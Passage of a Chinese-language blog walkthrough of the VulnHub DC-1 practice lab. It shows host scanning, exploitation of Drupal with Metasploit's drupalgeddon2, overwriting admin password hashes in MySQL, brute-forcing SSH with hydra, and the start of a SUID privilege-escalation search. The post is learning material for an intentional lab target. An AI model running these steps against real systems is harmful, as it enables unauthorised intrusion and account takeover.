<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DC靶机1-9 | 6s6's Blog</title><meta name="author" content="6s6"><meta name="copyright" content="6s6"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言一直想学学渗透，就先把这个靶场打了吧，呃前几个写的比较细，毕竟之前从来没接触过，后面几个靶场就写的有点略了 DC-1环境配置先搭环境，vulhub官网下载：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;dc&#x2F;DC-1.zip 把下好的.ova文件用vm打开就行，导入失败不要紧，重试一下即可，靶机要改为nat模式，目的是让攻击机和靶机在一个网段，默认是桥接模式，我看有的wp说桥接模式">
<meta property="og:type" content="article">
<meta property="og:title" content="DC靶机1-9">
<meta property="og:url" content="http://c0rnfl0w3r.github.io/2024/07/26/DC%E9%9D%B6%E6%9C%BA1-9/index.html">
<meta property="og:site_name" content="6s6&#39;s Blog">
<meta property="og:description" content="前言一直想学学渗透，就先把这个靶场打了吧，呃前几个写的比较细，毕竟之前从来没接触过，后面几个靶场就写的有点略了 DC-1环境配置先搭环境，vulhub官网下载：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;dc&#x2F;DC-1.zip 把下好的.ova文件用vm打开就行，导入失败不要紧，重试一下即可，靶机要改为nat模式，目的是让攻击机和靶机在一个网段，默认是桥接模式，我看有的wp说桥接模式">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://c0rnfl0w3r.github.io/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png">
<meta property="article:published_time" content="2024-07-26T08:17:56.000Z">
<meta property="article:modified_time" content="2024-07-26T08:18:58.751Z">
<meta property="article:author" content="6s6">
<meta property="article:tag" content="内网渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://c0rnfl0w3r.github.io/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png"><link rel="shortcut icon" href="/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png"><link rel="canonical" href="http://c0rnfl0w3r.github.io/2024/07/26/DC%E9%9D%B6%E6%9C%BA1-9/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'DC靶机1-9',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-26 16:18:58'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/滚动条.css"><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于作者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/%E8%83%8C%E6%99%AF.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="6s6's Blog"><span class="site-name">6s6's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于作者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DC靶机1-9</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-26T08:17:56.000Z" title="发表于 2024-07-26 16:17:56">2024-07-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-26T08:18:58.751Z" title="更新于 2024-07-26 16:18:58">2024-07-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DC靶机1-9"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直想学学渗透，就先把这个靶场打了吧，呃前几个写的比较细，毕竟之前从来没接触过，后面几个靶场就写的有点略了</p>
<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>先搭环境，vulhub官网下载：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p>
<p>把下好的<code>.ova</code>文件用vm打开就行，导入失败不要紧，重试一下即可，靶机要改为nat模式，目的是让攻击机和靶机在一个网段，默认是桥接模式，我看有的wp说桥接模式也行，反正看个人情况，最后kali能扫到靶机ip就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a322661056c.png" alt="image-20240715211110308.png"></p>
<p>这样就成功了，待会渗透得到密码就能进了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32265f3f76.png" alt="image-20240715204259477.png"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="探测目标IP地址"><a href="#探测目标IP地址" class="headerlink" title="探测目标IP地址"></a>探测目标IP地址</h3><p>探测主机的常见工具有arp-scan、nmap还有netdiscover</p>
<p>先用arp-scan，<code>-l</code>是指定扫描的目标IP地址范围，这里就是扫描默认的本地子网，显示所有被发现的设备的IP地址和MAC地址</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp-scan -l</span></span><br></pre></td></tr></table></figure>

<p>看下靶机的MAC地址</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a325932e9c8.png" alt="image-20240715211154174.png"></p>
<p>对应的ip就是<code>192.168.111.132</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32266b9272.png" alt="image-20240715211357967.png"></p>
<p>nmap也可以，<code>192.168.111.128</code>是我kali的ip，靶机和我的kali是同一网段的</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sP <span class="number">192.168.111.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>-sP</code>表示执行 Ping 扫描，等效于<code>-sn</code>，表示只进行主机发现，不进行端口扫描</p>
<p><code>192.168.111.0/24</code> 表示从 <code>192.168.111.1</code> 到 <code>192.168.111.254</code> 的所有 IP 地址（192.168.120.0和192.168.120.255有特殊含义不能当做ip地址）</p>
<p>以上指令表示 Nmap 将向这个子网范围内的每个 IP 地址发送 ICMP Echo 请求（类似于 <code>ping</code>）</p>
</blockquote>
<p>也是扫出了ip</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a322661d9ae.png" alt="image-20240715234101726.png"></p>
<p>最后用netdiscover也能扫，<code>-r</code> 选项来指定扫描的IP地址范围</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">netdiscover</span> -r <span class="number">192.168.111.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3226631839.png" alt="image-20240715234807747.png"></p>
<h3 id="探测目标IP开放端口"><a href="#探测目标IP开放端口" class="headerlink" title="探测目标IP开放端口"></a>探测目标IP开放端口</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sV -p- <span class="number">192.168.111.132</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>-sV</strong>：服务版本检测（Service Version Detection）。Nmap 将尝试确定在目标主机上运行的服务的版本信息。它不仅会识别服务（例如 HTTP, FTP, SSH 等），还会尝试确定具体的版本号（例如 Apache 2.4.41, OpenSSH 7.9p1）。</p>
<p>**-p-**：扫描所有端口，从 1 到 65535。默认情况下，Nmap 只扫描前 1000 个最常用的端口，但使用 <code>-p-</code> 可以覆盖所有可能的端口。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3226651800.png" alt="image-20240715235056417.png"></p>
<p>22是ssh，80是http协议，先看看80端口的web服务</p>
<h3 id="网页信息收集"><a href="#网页信息收集" class="headerlink" title="网页信息收集"></a>网页信息收集</h3><p>进去后登录的话不存在弱密码，用Wappalyzer看到很多信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32614d5f85.png" alt="image-20240716000808348.png"></p>
<p>Drupal 7，PHP 5.4.45，Apache 2.2.22，debian，扫目录虽然有东西但没啥用</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.111.132</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>cms的话直接搜就行，可以在漏洞库（<a target="_blank" rel="noopener" href="https://www.exploit-db.com/%EF%BC%89%E4%B8%8A%E6%89%BE%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%B7%A5%E5%85%B7Metasploit%EF%BC%8C%E5%85%88%E5%BC%80%E5%90%AF">https://www.exploit-db.com/）上找，也可以用工具Metasploit，先开启</a></p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure>

<p>然后查找</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">search Drupal</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3226667af7.png" alt="image-20240716003118607.png"></p>
<p>洞还是比较多，这里我们就用利用程度最大中最新的那个，2018-03-28那个，先use一下，使用这个漏洞利用模块</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32614b9484.png" alt="image-20240716171031214.png"></p>
<p>还要填参数，看下该模块的参数</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">options</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a326d25bb54.png" alt="image-20240716171510492.png"></p>
<blockquote>
<p>Current Setting是目前设置的内容</p>
<p>Required表示是否需要设置内容，yes为必须设置，no可以设置也可不设置</p>
</blockquote>
<p>所以我们还必须设置RHOSTS，RHOSTS就是攻击目标的IP，也就是靶机</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> RHOSTS <span class="comment">192.168.111.132</span></span><br></pre></td></tr></table></figure>

<p>这个时候再show一下就会发现已经设置好了，然后就是开始攻击了，用exploit或者run都行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32267757de.png" alt="image-20240716175348308.png"></p>
<p>出现Meterpreter session 1 opened意味着成功建立了一个 Meterpreter 会话，也就相当于kali和靶机成功连接，</p>
<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>接下来就是输入shell进入linux的shell了，这只是一个普通shell，可以看到ls也是成功执行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a326d1d5bdd.png" alt="image-20240716175712351.png"></p>
<p>有点丑，弄个pyhton交互式shell，前提是目标靶机上要有python</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>导入 Python 的伪终端模块（pseudo-terminal module），简称 <code>pty</code>，创建一个交互式shell</p>
</blockquote>
<p>成功创建交互式shell，只是个普通用户的权限，非root，先看下flag1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a326d1cd42d.png" alt="image-20240716180123275.png"></p>
<p>flag1</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每个好的<span class="built_in">CMS</span>都需要一个配置文件，你也一样</span><br></pre></td></tr></table></figure>

<p>可以看看还有没有flag文件<code>find / -name flag*</code>，其中<code>/</code>表示从根目录开始搜索，但没搜到其他flag文件了，那就按flag1说的看看Drupal的配置文件吧，随便搜就搜得到Drupal的配置文件在网站根目录下的<code>sites/default/settings.php</code>文件中，不确定的话也可以直接看看有哪些settings.php文件</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name settings.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32267b7f7c.png" alt="image-20240716183513145.png"></p>
<p>找到了flag2</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">暴力破解和字典攻击并不是获取访问权限的唯一方法（而且你确实需要访问权限），你能用这些凭证做什么？</span><br></pre></td></tr></table></figure>

<p>还给了mysql数据库的账号和密码，那下一步很明显就是进mysql数据库了</p>
<h2 id="数据库渗透"><a href="#数据库渗透" class="headerlink" title="数据库渗透"></a>数据库渗透</h2><p>用得到的账户和密码进入数据库</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mysql</span> -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里注意-u和-p后面直接跟值，不用跟空格</p>
</blockquote>
<p>进去后就是查看数据了</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">show</span> datebases;         <span class="comment">//查数据库</span></span><br><span class="line">use drupaldb;           <span class="comment">//换成drupaldb数据库</span></span><br><span class="line"><span class="built_in">show</span> <span class="built_in">tables</span>;            <span class="comment">//查表</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users;    <span class="comment">//查users表</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a326d25e395.png" alt="image-20240716232901510.png"></p>
<p>有两个账户，我们看到密码很复杂，应该不是明文，也不知道具体是什么加密，这时在网上有两种方法：<a target="_blank" rel="noopener" href="https://drupalchina.cn/node/2128">忘记Drupal的管理员密码的解决办法 | Drupal China</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a326d2592d9.png" alt="image-20240716233420575.png"></p>
<p>第一个方法是加个admin权限的用户，第二个就是直接替换admin账户的密码</p>
<p>这里我们就用方法二：替换admin账户密码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span>;                                                    <span class="regexp">//</span>退出mysql数据库</span><br><span class="line">cat <span class="regexp">/var/</span>www<span class="regexp">/scripts/</span>password-hash.sh                    <span class="regexp">//</span>打开加密脚本看如何传参</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a326d18cb47.png" alt="image-20240716234719114.png"></p>
<p>脚本后直接跟想加密的字符串就行，这个脚本是php写的</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www<span class="operator">-</span>data<span class="meta">@DC</span><span class="operator">-</span><span class="number">1</span>:<span class="regexp">/var/</span>www$ php <span class="regexp">/var/</span>www<span class="regexp">/scripts/</span>password<span class="operator">-</span>hash.sh admin </span><br><span class="line">php <span class="regexp">/var/</span>www<span class="regexp">/scripts/</span>password<span class="operator">-</span>hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 hash: <span class="variable">$S</span><span class="variable">$DSD</span><span class="regexp">/.FsYKfipHHlILEUZ/</span>oylMD41E3t8tY2WJ4HlzAExtaPjbo<span class="operator">/</span><span class="type">N</span></span><br></pre></td></tr></table></figure>

<p>然后就是上数据库改密码了</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass = &quot;$S$DSD/.FsYKfipHHlILEUZ/oylMD41E3t8tY2WJ4HlzAExtaPjbo/N&quot; <span class="keyword">where</span> <span class="type">name</span> = <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="type">name</span> = <span class="string">&#x27;Fred&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>方法一的话，drupal7版本在有个SQL注入的漏洞，可以添加一个admin权限的用户，适用版本7.31以下，msf上就有这个工具，懒得看了，登录进后台在content找到flag3</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a326d24149f.png" alt="image-20240716235752110.png"></p>
<p>flag3</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">特殊的权限（PERMS）将帮助你找到密码（passwd），但是你需要通过执行（-<span class="built_in">exec</span>）那个命令来找出如何获取shadow文件中的内容。</span><br></pre></td></tr></table></figure>

<p>就是提示让我们看<code>/etc/passwd</code>和<code>/etc/shadow</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;passwd内容解释（超详细）</a></p>
<p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/840.html">Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细）</a></p>
</blockquote>
<p>第一个就是存着用户的基本信息，所有用户都能读，第二个存在用户的敏感信息，如密码，root权限才能看</p>
<h2 id="用户密码爆破"><a href="#用户密码爆破" class="headerlink" title="用户密码爆破"></a>用户密码爆破</h2><p><code>/etc/passwd</code>中有个flag4用户，还有个路径<code>/home/flag4</code>，想登录flag4用户的话，要么爆破密码，要么提权打开shadow文件查看密码（其实想看flag4直接看<code>/home/flag4</code>就行，这里没打过，走下流程）</p>
<p>利用工具Hydra爆破flag4的密码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz ssh:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">111.132</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a326d317c42.png" alt="image-20240717001822138.png"></p>
<blockquote>
<p>-l：指定登录用户名</p>
<p>-P：指定密码字典文件的路径</p>
<p>ssh:&#x2F;&#x2F;192.168.120.128：指定要攻击的目标主机和协议</p>
</blockquote>
<p>得到密码orange，然后ssh连接<code>ssh flag4@192.168.120.128</code>，输密码进去后得到flag4</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">您能使用相同的方法找到或访问根目录中的<span class="built_in">flag</span>吗？也许可以。但或许并不那么容易。或许也可能是这样？</span><br></pre></td></tr></table></figure>

<p>没权限访问根目录，那接下来就是提权了</p>
<h2 id="Liunx提权"><a href="#Liunx提权" class="headerlink" title="Liunx提权"></a>Liunx提权</h2><p>用suid提权，参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 - FreeBuf网络安全行业门户</a></p>
<p>简单来说就是通过非root用户登录时，如果某个文件设置了SUID权限，我们可在非root用户下运行该二进制可执行文件，在执行文件时，该进程的权限将为root权限，利用此特性，我们就可通过SUID进行提权</p>
<p>查找有suid权限的文件</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>-perm -u=s</code>：用于查找设置了suid权限的文件</p>
<p><code>-type f</code>：指定了只查找类型为“文件”（file）的对象，排除了目录和其他类型的文件系统对象。</p>
